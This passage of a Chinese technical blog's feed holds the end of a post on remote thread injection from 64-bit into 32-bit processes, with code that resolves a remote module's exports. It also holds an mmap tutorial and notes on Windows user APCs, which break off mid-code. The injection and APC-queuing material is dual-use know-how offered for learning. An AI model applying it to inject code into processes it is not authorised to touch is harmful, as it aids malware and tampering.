class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)buffer ;</span><br><span class="line">    DWORD funcAddr = (DWORD)( exportDir-&gt;AddressOfFunctions);</span><br><span class="line">    DWORD nameAddr = (DWORD)( exportDir-&gt;AddressOfNames);</span><br><span class="line">    DWORD nameOrdAddr = (DWORD)( exportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        <span class="type">char</span> name[<span class="number">256</span>];</span><br><span class="line">        DWORD TrueNameAddr;</span><br><span class="line">        WORD TrueOrd;</span><br><span class="line">        DWORD TrueFuncAddr;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (BYTE*)hModule + nameAddr + <span class="built_in">sizeof</span>(DWORD)*i, &amp;TrueNameAddr, <span class="built_in">sizeof</span>(TrueNameAddr), &amp;bytesRead)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (LPCVOID)((BYTE*)hModule + (DWORD)TrueNameAddr), name, <span class="built_in">sizeof</span>(name), &amp;bytesRead)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">stricmp</span>(name, lpProcName) == <span class="number">0</span>) &#123;</span><br><span class="line">            DWORD LoadLibraryAddr = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (BYTE*)hModule + nameOrdAddr + <span class="built_in">sizeof</span>(WORD)*i, &amp;TrueOrd, <span class="built_in">sizeof</span>(TrueOrd), &amp;bytesRead)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (BYTE*)hModule + funcAddr + <span class="built_in">sizeof</span>(DWORD)*(TrueOrd), &amp;TrueFuncAddr, <span class="built_in">sizeof</span>(TrueFuncAddr), &amp;bytesRead)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> (FARPROC)(TrueFuncAddr + (BYTE*)hModule);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再判断注入的目标进程是不是 32 位的来选择合适的获取地址的方式去注入，最后实现也非常成功。</p><p><a href="https://github.com/xia0ji233/Xprocess/issues/2">issue 原文</a></p><p><a href="https://github.com/xia0ji233/Xprocess/commit/cb091a4347fdcc3a1d812b1740f6a14d214b7888">本次的 commit</a></p><p>特此分享一下本次的经历，也给各位师傅们一个 64 位注入 32 位进程的参考案例。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1] <a href="https://cloud.tencent.com/developer/article/1471341">https://cloud.tencent.com/developer/article/1471341</a></li></ul>]]></content>
    
    
    <summary type="html">故事开始于有人在我的项目中提了issue</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="RemoteThreadInject" scheme="https://xia0ji233.github.io/categories/Windows/RemoteThreadInject/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux mmap</title>
    <link href="https://xia0ji233.github.io/2024/06/10/mmap/"/>
    <id>https://xia0ji233.github.io/2024/06/10/mmap/</id>
    <published>2024-06-09T19:00:00.000Z</published>
    <updated>2024-06-09T19:01:28.825Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习一下 Linux 的 9 号系统调用 mmap，它在虚拟内存的管理中拥有着至高无上的地位。</p><span id="more"></span><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>众所周知，虚拟内存是一种非常成功的计算机内存管理技术。它使得多个进程可以拥有相同的地址，并且应用层开发者不必考虑不同进程地址冲突的问题，所有的进程都可以使用同样地址的虚拟内存。</p><p>每个进程的虚拟内存都是独立的，进程看似拥有一大片内存，实际上能用的仅有一小部分，而正是虚拟内存技术拯救了这一切，使得物理内存不会被过度碎片化而导致利用率低下。</p><h2 id="mmap函数介绍"><a href="#mmap函数介绍" class="headerlink" title="mmap函数介绍"></a>mmap函数介绍</h2><p>它用于创建一片虚拟内存，这个虚拟内存可以是映射新分配的物理内存，也可以是映射已有的物理内存，甚至是映射磁盘文件。</p><p>同样先看它的函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *start, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">           <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="comment">// 返回：若成功时则为指向映射区域的指针，若出错则为 MAP_FAILED(-1)。</span></span><br></pre></td></tr></table></figure><p>参数解释：</p><ul><li>start：按时 mmap 尽量以该地址为起点分配连续内存，如果给 NULL 值，则会随机分配。</li><li>length：指示虚拟内存的长度，一般会以页为单位。</li><li>prot：指示虚拟内存的保护属性，一般为下面四个宏或者其组合：<ul><li>PROT_EXEC：这个区域内的页面由可以被 CPU 执行的指令组成。</li><li>PROT_READ：这个区域内的页面可读。</li><li>PROT_WRITE：这个区域内的页面可写。</li><li>PROT_NONE：这个区域内的页面不能被访问。</li></ul></li><li>flags：指示该虚拟内存的映射方式，通常需要指定 MAP_SHARED 和 MAP_PRIVATE 中的其中一个，具体标志位如下所示：<ul><li>MAP_FIXED：如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。</li><li>MAP_SHARED：对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</li><li>MAP_PRIVATE：对映射区域的写入操作会产生一个映射文件的复制，该内存区域所对的实际内存是写拷贝的，任何修改不会对原文件产生操作。</li><li>MAP_ANONYMOUS：建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</li><li>MAP_DENYWRITE：只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</li><li>MAP_LOCKED：将映射区域锁定住，该内存区域在程序运行时不会被交换出去。</li></ul></li><li>fd：指示映射到内存的文件描述符。</li><li>offset：文件的偏移量。</li></ul><h2 id="mmap的具体用途"><a href="#mmap的具体用途" class="headerlink" title="mmap的具体用途"></a>mmap的具体用途</h2><h3 id="映射文件"><a href="#映射文件" class="headerlink" title="映射文件"></a>映射文件</h3><p>为了避免大量 IO，可以选择以共享方式将文件映射到内存中，如果想操作文件可以仅仅修改映射的内存便可以达到修改文件的效果，下面是示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *filename=<span class="string">&quot;./tmpfile&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_file</span><span class="params">()</span>&#123;</span><br><span class="line">    unlink(filename);</span><br><span class="line">    <span class="type">int</span> fd=open(filename,O_RDWR|O_CREAT,<span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        write(fd,<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    prepare_file();</span><br><span class="line">    <span class="type">int</span> fd=open(filename,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MAP_SHARED;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *area=mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(area==<span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">        ((<span class="type">char</span> *)area)[i]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在运行之后，创建一个带有 4096 个 a 的文件，并且每秒将内存中的 a 修改为 1，同时外部可以不停地 cat 文件，会发现文件会被同步修改。</p><h3 id="匿名内存"><a href="#匿名内存" class="headerlink" title="匿名内存"></a>匿名内存</h3><p>在 flags 中加入标志 MAP_ANONYMOUS 可以选择不映射文件而是选择让内核自己找一片空的内存映射出来。这个如果还设置了共享标志位 MAP_SHARED，那么这段内存将只有一份，由其它所有映射了这片内存的进程共享。</p><p>因为是匿名内存，不关联任何对象，因此另外一个与此毫无关联的进程无法直接映射这片内存，所以如果要做多进程共享内存，则需要映射完内存之后 fork 进程，这样多个进程就会共享这片内存了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MAP_ANONYMOUS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_ANONYMOUS 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *ptr=mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">                ptr[i]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">0x1000</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">                ptr[i]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(ptr);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果也可以发现两个子进程的修改都可以被父进程读取到。</p><img src="/2024/06/10/mmap/1.png" class="">]]></content>
    
    
    <summary type="html">今天学习一下 Linux 的 9 号系统调用 mmap</summary>
    
    
    
    <category term="Linux" scheme="https://xia0ji233.github.io/categories/Linux/"/>
    
    <category term="mmap" scheme="https://xia0ji233.github.io/categories/Linux/mmap/"/>
    
    
  </entry>
  
  <entry>
    <title>用户APC机制学习</title>
    <link href="https://xia0ji233.github.io/2024/06/04/APC1/"/>
    <id>https://xia0ji233.github.io/2024/06/04/APC1/</id>
    <published>2024-06-03T17:00:00.000Z</published>
    <updated>2024-06-03T17:38:51.599Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下 Windows 的 APC 机制</p><span id="more"></span><h2 id="APC简介"><a href="#APC简介" class="headerlink" title="APC简介"></a>APC简介</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>异步过程调用 (APC) 是异步执行的函数。 APC 类似于延迟过程调用 (DPC)，但与 DPC 不同，APC 在特定线程的上下文中执行。 除文件系统和文件系统筛选器驱动程序以外的驱动程序不直接使用 APC，但操作系统的其他部分使用 APC，因此你需要了解 APC 的工作原理[1]。</p><p>过程调用可以理解为C语言当中的函数，而异步就是它区别于一般过程调用的特征（先说一句废话）。</p><h3 id="结构体分析"><a href="#结构体分析" class="headerlink" title="结构体分析"></a>结构体分析</h3><p>那么先来看看 APC 的内核结构体[3]。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KAPC</span> &#123;</span></span><br><span class="line">    UCHAR Type;</span><br><span class="line">    UCHAR SpareByte0;</span><br><span class="line">    UCHAR Size;</span><br><span class="line">    UCHAR SpareByte1;</span><br><span class="line">    ULONG SpareLong0;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTHREAD</span> *<span class="title">Thread</span>;</span></span><br><span class="line">    LIST_ENTRY ApcListEntry;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _NTSYSTEM_</span></span><br><span class="line">    PKKERNEL_ROUTINE KernelRoutine;</span><br><span class="line">    PKRUNDOWN_ROUTINE RundownRoutine;</span><br><span class="line">    PKNORMAL_ROUTINE NormalRoutine;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID Reserved[<span class="number">3</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID NormalContext;</span><br><span class="line">    PVOID SystemArgument1;</span><br><span class="line">    PVOID SystemArgument2;</span><br><span class="line">    CCHAR ApcStateIndex;</span><br><span class="line">    KPROCESSOR_MODE ApcMode;</span><br><span class="line">    BOOLEAN Inserted;</span><br><span class="line">&#125; KAPC, *PKAPC, *RESTRICTED_POINTER PRKAPC;</span><br></pre></td></tr></table></figure><p>拿到一个结构体不一定先理解它各个成员的含义，可以先按照自己的想法给它予以一些成员，再通过比对去更完善地认识这些成员。<br>计算机执行的最小单位就是线程，而一个线程可以调用多个过程，因此成员中有一个 _KTHREAD * 类型的结构体指示了这个过程所属的线程。一个过程你应当告知它从何处开始，其实这里跟线程差不多，线程也有 StartRoutine 这个成员标识，而 APC 会有类似的三个变量（KernelRoutine，RundownRoutine，NormalRoutine）来标识它的起点。</p><p>Normal 和 Kernel 应该会标识这个 APC 在用户模式下和内核模式下的入口。</p><p>至于 RundownRoutine，这里参考一篇外文文献。</p><blockquote><p>In general, every APC object must contain a valid <strong>KernelRoutine</strong> function pointer, whatever its kind. This driver-defined routine will be the first one to run when the APC is successfully delivered and executed by the NT’s APC dispatcher. User-mode APCs must also contain a valid <strong>NormalRoutine</strong> function pointer, which must reside in user memory. Likewise, regular kernel-mode APCs contain a valid <strong>NormalRoutine</strong>, which runs in kernel mode just like <strong>KernelRoutine</strong>. Optionally, either kind of APC may define a valid <strong>RundownRoutine</strong>. This routine must reside in kernel memory and is only called when the system needs to discard the contents of the APC queues, such as when the thread exits. In this case, neither <strong>KernelRoutine</strong> nor <strong>NormalRoutine</strong> are executed, just the <strong>RundownRoutine</strong>. An APC without such a routine will be deleted[4].</p></blockquote><p>这一段主要讲述了，不论是用户 APC 还是内核 APC，都需要定义一个正确的KernelRoutine，用户模式的APC需要额外定义 NormalRoutine。当线程退出且该APC结构没有被执行时，会执行 RundownRoutine 所指向的处理函数。没有定义 RundownRountine 的 APC（即 <code>RundownRoutine==NULL</code> 且没有被执行的 APC）会被系统直接释放（执行 <code>ExFreePool(APC)</code>）。</p><p>如果程序员没有使用 <code>ExAllocatePool(NonPagedPool，sizeof(KAPC))</code> 的方式去分配内存时，则必须定义 <code>RundownRoutine</code> 去指示系统释放该 APC。这里存疑一下，如果线程 APC 被执行完毕需要释放，那么是否需要通过 RundownRoutine 去告知系统调用该函数去释放该 APC。</p><p>再来看另一个结构体 KAPC_STATE，它的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KAPC_STATE</span> &#123;</span></span><br><span class="line">    LIST_ENTRY ApcListHead[MaximumMode];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPROCESS</span> *<span class="title">Process</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        UCHAR InProgressFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            BOOLEAN KernelApcInProgress : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN SpecialApcInProgress : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    BOOLEAN KernelApcPending;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        BOOLEAN UserApcPendingAll;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            BOOLEAN SpecialUserApcPending : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN UserApcPending : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; KAPC_STATE, *PKAPC_STATE, *PRKAPC_STATE;</span><br></pre></td></tr></table></figure><p>里面有很明显的双向链表结构，并且有两个，对应了用户和内核的 APC 队列，它包含了 KAPC 结构体。其实这里看到这个结构体我突然想起来内核附加进程读取进程的虚拟内存的函数 <code>KeStackAttachProcess</code> 函数似乎有一个参数保存了这个结构体。它可以理解为是保存了一个APC队列和其它一些APC的信息，并且内核中的线程结构体 <code>_KTHREAD</code> 中存在一个成员就是 _KAPC_STATE。</p><ul><li>KernelApcInProgress：指示内核<code>APC</code>是否正在执行。</li><li>KernelApcPending：指示是否有正在等待执行的内核<code>APC</code>。</li><li>UserApcPending：指示是否有正在等待执行的用户<code>APC</code>。</li></ul><h3 id="线程的一些小tips"><a href="#线程的一些小tips" class="headerlink" title="线程的一些小tips"></a>线程的一些小tips</h3><p>这里有一些概念可能对于刚接触这些知识的人（比如我）有一些小小的震撼，比如：</p><blockquote><p>线程执行时独占CPU，线程不能被结束，挂起，恢复，一切的操作都是它自己主动调用的。举个极端的例子，假设一个线程屏蔽中断，代码保证不出现异常，如果不提供其它机制改变线程的行为，那么线程将永久占据 CPU。</p></blockquote><p>根据 Linux 迁移过来的一些知识点，一个进程（没有探究过线程，就类比了一下）被结束是因为某个进程调用了 kill 给进程发送了 9 号信号（SIG_KILL），内核循环遍历每个进程信号的时候，发现 SIG_KILL 信号就会强制中断该进程。</p><p>而 Windows 的线程如果是被结束，那么是被其它进程或线程提供给了它一个函数，让它自己执行，这个函数就是 APC（异步过程调用）了。</p><p>比如结束一个线程，就是将 exit 函数（Maybe）挂到了对应线程的 APC_STATE 里面的链表当中执行。在某些时刻（先留下疑惑），内核会检查链表中的内容，便会执行 APC 链表中的函数。这样看起来就好像是别的线程给它结束的了，但是其实是它自己调用了结束线程的函数。</p><h3 id="如何向线程插入APC"><a href="#如何向线程插入APC" class="headerlink" title="如何向线程插入APC"></a>如何向线程插入APC</h3><p>理论如上所示了，下面演示下如何插入 APC 执行。用户层下，插入 APC 的 API 为 QueueUserAPC 和 QueueUserAPC2。</p><h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><p>将用户模式异步过程调用（APC）对象添加到指定线程的 APC 队列。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] PAPCFUNC  pfnAPC,</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] HANDLE    hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] ULONG_PTR dwData</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>三个参数也很好记：</p><ul><li>pfnAPC：APC 函数指针</li><li>hThread：要插入 APC 函数的线程的线程句柄</li><li>dwData：函数的参数</li></ul><h4 id="QueueUserAPC2"><a href="#QueueUserAPC2" class="headerlink" title="QueueUserAPC2"></a>QueueUserAPC2</h4><p>这个函数可以约等于上个函数的扩展。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">QueueUserAPC2</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PAPCFUNC             ApcRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE               Thread,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG_PTR            Data,</span></span></span><br><span class="line"><span class="params"><span class="function">    QUEUE_USER_APC_FLAGS Flags</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>多了一个参数</p><ul><li>Flags：用于修改用户模式 APC 的行为。</li></ul><p>它的参数类型是一个枚举类型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_QUEUE_USER_APC_FLAGS</span> &#123;</span><br><span class="line">    QUEUE_USER_APC_FLAGS_NONE,</span><br><span class="line">    QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,</span><br><span class="line">    QUEUE_USER_APC_CALLBACK_DATA_CONTEXT</span><br><span class="line">&#125; QUEUE_USER_APC_FLAGS;</span><br></pre></td></tr></table></figure><h3 id="线程何时执行APC"><a href="#线程何时执行APC" class="headerlink" title="线程何时执行APC"></a>线程何时执行APC</h3><p>根据 MSDN 的说法，特殊的用户模式 APC 严格在用户模式下运行，并且始终执行，即使目标线程不处于可警报等待（alertable）状态。</p><p>正常 APC 仅在线程处于可警报等待（alertable）状态时，才会执行 APC。这里就体现出了这个异步了，即插入 APC 动作是线程 A 完成的，什么时候执行由线程 B 完成的。</p><p>对于内核 APC，普通内核 APC 在 <code>IRQL=PASSIVE_LEVEL</code> 内核模式运行，特殊内核 APC 在 <code>IRQL=PASSIVE_LEVEL</code>，IRQL 即 Windows 实现的软件中断优先级。从低到高依次为：</p><ul><li><strong>PASSIVE_LEVEL</strong>：IRQL 最低级别,没有被屏蔽的中断，在这个级别上，线程执行用户模式，可以访问分页内存。</li><li><strong>APC_LEVEL</strong>：在这个级别上，只有APC级别的中断被屏蔽，可以访问分页内存。当有APC发生时，处理器提升到APC级别，这样，就屏蔽掉其它APC，为了和APC执行一些同步，驱动程序可以手动提升到这个级别。</li><li><strong>DISPATCH_LEVEL</strong>：屏蔽关闭的中断 - DISPATCH_LEVEL中断和APC_LEVEL中断被屏蔽。 可能会发生设备、时钟和电源故障中断。</li><li><strong>DIRQL</strong>：IRQL &lt; 处的所有中断 &#x3D; 驱动程序中断对象的 DIRQL。 可能会发生具有较高 DIRQL 值的设备中断，以及时钟和电源故障中断。</li></ul><p>有一个 API 可以直接将线程设置为 alertable 的状态，就是 SleepEx。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">SleepEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] DWORD dwMilliseconds,</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] BOOL  bAlertable</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>相比于 Sleep 函数，多了一个 bAlertable 参数，如果将这个参数置为 1，则线程变为 alertable 状态，休眠期间若发生 I&#x2F;O 完成回调，则函数立刻返回，或者当前线程存在 APC，则被中断直接调用 APC 函数，调用完毕之后直接返回。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 